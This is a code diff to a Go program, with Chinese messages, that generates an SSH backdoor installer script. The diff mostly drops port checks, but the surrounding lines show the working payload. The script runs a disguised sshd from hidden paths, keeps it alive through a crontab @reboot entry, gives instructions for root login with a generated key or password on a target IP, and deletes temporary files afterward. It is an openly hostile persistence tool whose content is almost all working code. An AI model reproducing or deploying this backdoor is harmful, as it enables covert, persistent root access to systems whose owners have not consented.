@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"net"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -38,13 +37,11 @@ func getUserInput(prompt string) string {
 }
 
 func NewSSHBackdoor() (*SSHBackdoor, error) {
-	// 默认值
 	backdoor := &SSHBackdoor{
 		LinkPath: "/tmp/.sshd",
 		KeyPath:  "/tmp/.ssh_key",
 	}
 
-	// 获取并验证端口
 	for {
 		portStr := getUserInput("请输入SSH后门端口 (1024-65535): ")
 		port, err := strconv.Atoi(portStr)
@@ -60,12 +57,6 @@ func NewSSHBackdoor() (*SSHBackdoor, error) {
 
 		if !isPortAvailable(port) {
 			fmt.Printf("[-] 错误: 端口 %d 已被占用\n", port)
-			// 显示当前端口使用情况
-			fmt.Println("\n当前端口使用情况:")
-			fmt.Println("-------------------")
-			output, _ := exec.Command("netstat", "-tlnp").Output()
-			fmt.Println(string(output))
-			fmt.Println("-------------------")
 			continue
 		}
 
@@ -85,13 +76,6 @@ func (s *SSHBackdoor) GeneratePayload(outDir string) error {
 SSH_PORT={{.Port}}
 LINK_PATH="{{.LinkPath}}"
 KEY_PATH="{{.KeyPath}}"
-
-# 验证端口可用性
-if netstat -tlnp 2>/dev/null | grep -q ":$SSH_PORT "; then
-    echo "[-] 错误: 端口 $SSH_PORT 已被占用"
-    netstat -tlnp | grep ":$SSH_PORT "
-    exit 1
-fi
 
 # 创建隐藏目录
 HIDE_DIR="/var/tmp/.system"
@@ -153,20 +137,11 @@ if ! ps aux | grep -q "$LINK_PATH"; then
     exit 1
 fi
 
-if ! netstat -tlnp 2>/dev/null | grep -q ":$SSH_PORT "; then
-    echo "[-] 错误: 端口 $SSH_PORT 未在监听"
-    exit 1
-fi
-
-ps aux | grep sshd
-netstat -tlnp | grep $SSH_PORT
-
 echo "[+] 添加持久化..."
 echo "@reboot $LINK_PATH -f /tmp/sshd_config -D" | crontab -
 
 echo "[+] 保存并设置私钥权限..."
 install -m 600 $KEY_PATH ./id_ed25519
-# 验证私钥权限
 ls -la ./id_ed25519
 
 echo "[+] 清理临时文件..."
@@ -175,7 +150,7 @@ rm -f ${KEY_PATH}*
 echo "[+] SSH后门安装完成"
 echo "[+] 后门端口: $SSH_PORT"
 echo "[+] 使用方法:"
-echo "    1. 使用密钥登录:"
+echo "    1. 下载id_ed25519，使用密钥登录:"
 echo "       ssh -i ./id_ed25519 -p $SSH_PORT root@<目标IP>"
 echo "    2. 使用密码登录:"
 echo "       ssh -p $SSH_PORT root@<目标IP>"
@@ -189,9 +164,8 @@ echo "    查看sshd配置:   cat /tmp/sshd_config"
 echo "    查看公钥:       cat ~/.ssh/authorized_keys"
 echo "    查看私钥权限:   ls -la ./id_ed25519"
 echo "    查看进程:       ps aux | grep sshd"
-echo "    查看端口:       netstat -tlnp | grep $SSH_PORT"
 echo
-echo "[+] 测试连接:"
+echo "[+] 测试本地连接:"
 echo "    ssh -v -i ./id_ed25519 -p $SSH_PORT -o StrictHostKeyChecking=no root@127.0.0.1"
 `
 	scriptPath := filepath.Join(outDir, "ssh_backdoor.sh")
